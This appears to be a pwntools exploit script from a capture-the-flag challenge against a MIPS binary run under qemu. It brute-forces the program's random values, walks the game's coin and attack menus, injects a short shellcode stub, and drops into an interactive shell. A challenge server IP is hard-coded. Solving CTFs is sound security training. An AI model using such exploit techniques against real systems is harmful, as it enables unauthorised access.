
# -*- coding: UTF-8 -*-
from pwn import *
from pwnlib.util.iters import mbruteforce 

context.log_level = 'debug'
context.arch = "mips"
context.endian = "little"
context.terminal = ["/usr/bin/tmux","sp","-h"]
binary = 'pwn'
local = 1
if local == 1:
    #io=process(argv=['qemu-mipsel','-g','1234','-L','./','pwn'])
    io=process(argv=['qemu-mipsel','-L','./','pwn'])
else:
    io=remote('39.106.131.193',43268)
e=ELF(binary)

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))


randnum = [0,1,1,2,4,0,4,4,7,0,9,1,8,9,2,9,8,2,9,4,1,15,2,0,0,13,20,13,8,13,7,11,5,13,0,15,24,11,4,34,33,2,33,19,33,39,30,42,30,36,12,2,2,5,38,12,50,5,2,10,7,31,16,37,12,20,18,63,67,30,70,45,3,15,69,10,28,67,23,64,75,32,19,79,14,11,18,20,29,10,63,46,40,10,30,23,57,48,23,92]
randnum = [
0, 1, 2, 1, 4, 5, 4, 5, 8, 9, 8, 5, 5, 11, 14, 5, 16, 17, 5, 9, 11, 19, 3, 5, 4, 5, 17, 25, 14, 29, 30, 5, 8, 33, 4, 17, 32, 5, 5, 29, 33, 11, 0, 41, 44, 3, 6, 5, 46, 29, 50, 5, 47, 17, 19, 53, 5, 43, 52, 29, 32, 61, 53, 5, 44, 41, 60, 33, 26, 39, 1, 53, 52, 69, 29, 5, 74, 5, 29, 69, 44, 33, 36, 53, 84, 43, 14, 85, 81, 89, 18, 49, 92, 53, 24, 5, 93, 95, 8, 29
]
print randnum
gg = randnum

def gg_func():
    io=process(argv=['qemu-mipsel','-L','./','pwn'])
    for k in range(len(gg)):
        try:
            io.sendlineafter('Go> \n','1')
            io.sendlineafter('much do you want?\n',str(gg[k]))     
            msg = io.recvn(0x20)
            if 'You have coins' in msg:
                continue
        except:
            gg[k] -= 1
            io.close()
            io.shutdown()
            io.kill()
            print('++++++',str(k),str(gg[k]),str(sum(gg)))
            break
            

def get_coin():
    for i in range(len(randnum)-1):
        sla('Go> \n','1')
        sla('much do you want?\n',str(randnum[i]))

        
def get_attack(idx):
    sla('Go> \n','3')
    sla('> \n',str(idx))

'''
# get random
for i in range(300):
    gg_func()

print(gg)
'''
shellcode = '''
li $a1,0
li $a2,0
'''
print(shellcode)
print(len(asm(shellcode)))
#pause()
get_coin()
get_attack(3)
get_attack(2)
try:
    sla('Go> \n','1')
    sla('much do you want?\n','1')
    #sla('Shellcode > \n',asm(shellcode))
    sa('Shellcode > \n',asm(shellcode))
    irt()
except:
    pass
